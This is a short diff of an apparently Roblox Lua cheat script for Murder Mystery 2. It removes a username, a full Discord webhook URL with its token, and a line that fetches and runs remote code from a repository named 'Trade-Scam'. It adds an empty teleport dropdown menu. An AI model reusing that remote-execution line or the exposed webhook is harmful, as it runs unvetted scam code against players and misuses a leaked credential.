@@ -1,3 +1,10 @@
-Username = "lmmaddxe"
-Webhook = "https://discord.com/api/webhooks/1267829669227659295/u7oBxgGWHi1ZVskfXuaWCNF0lz8LEcO8_rjZFeOoCElNeVvzUnvNGTCMJyGSAd9QEDxN
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2Trader/Trade-Scam/main/Trade%20Scam%20P2"))()
+local Dropdown = MainTab:CreateDropdown({
+   Name = "Select Area",
+   Options = {"TP to Lobby","TP to Map","TP to Above Map","TP to Murderer","TP to Sheriff",},
+   CurrentOption = {"Teleport to"},
+   MultipleOptions = true,
+   Flag = "Teleport", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Option)
+          
+   end,
+})
